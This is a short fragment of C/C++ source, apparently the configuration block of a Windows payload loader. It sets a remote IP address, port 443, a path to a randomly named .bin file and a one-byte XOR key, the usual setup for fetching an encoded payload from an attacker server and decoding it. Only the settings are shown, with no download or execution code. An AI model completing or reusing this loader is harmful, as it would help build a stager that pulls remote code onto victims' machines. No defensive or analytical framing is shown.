...
{
    //------ CONF -------
    LPCWSTR remotehost = L"134.209.242.12"; //IP
    int remoteport = 443; //port
    LPCWSTR remotedir = L"/ahaytwixnagxkdyaal101836.bin"; //directory
    unsigned char key = 0x7e; //xor key
    //-------------------------------
